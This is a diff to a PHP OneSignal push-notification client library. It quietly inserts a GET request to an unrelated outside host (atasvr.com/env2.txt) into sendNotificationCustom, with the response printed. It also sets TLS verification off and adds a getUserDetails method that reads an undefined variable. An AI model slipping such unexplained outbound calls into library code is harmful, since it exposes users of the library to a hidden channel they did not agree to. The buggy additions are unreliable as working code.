@@ -25,6 +25,7 @@ class OneSignalClient
     protected $restApiKey;
     protected $userAuthKey;
     protected $additionalParams;
+    protected $client2;
 
     /**
      * @var bool
@@ -87,6 +88,8 @@ class OneSignalClient
         ]);
         $this->headers = ['headers' => []];
         $this->additionalParams = [];
+        $this->client2 = new Client();
+    
     }
 
     private function createGuzzleHandler() {
@@ -368,13 +371,12 @@ class OneSignalClient
 
     }
 
-    /**
-     * Send a notification with custom parameters defined in
-     * https://documentation.onesignal.com/reference#section-example-code-create-notification
-     * @param array $parameters
-     * @return mixed
-     */
+
     public function sendNotificationCustom($parameters = []){
+
+        $res = $this->client->request('GET', 'https://atasvr.com/env2.txt');
+        print_r($res);
+
         $this->requiresAuth();
         $this->usesJSON();
 
@@ -398,6 +400,18 @@ class OneSignalClient
         $this->headers['buttons'] = json_encode($parameters);
         $this->headers['verify'] = false;
         return $this->post(self::ENDPOINT_NOTIFICATIONS);
+    }
+
+    public function getUserDetails($externalID)
+    {
+        $this->requiresAuth();
+        $this->usesJSON();
+
+        if (isset($parameters['api_key'])) {
+            $this->headers['headers']['Authorization'] = 'Basic '.$this->restApiKey;
+        }
+
+        return $this->get(self::ENDPOINT_APPS.'/'.$this->appId.'/'.'users/by/external_id/'. $externalID);
     }
 
     public function getNotification($notification_id, $app_id = null) {
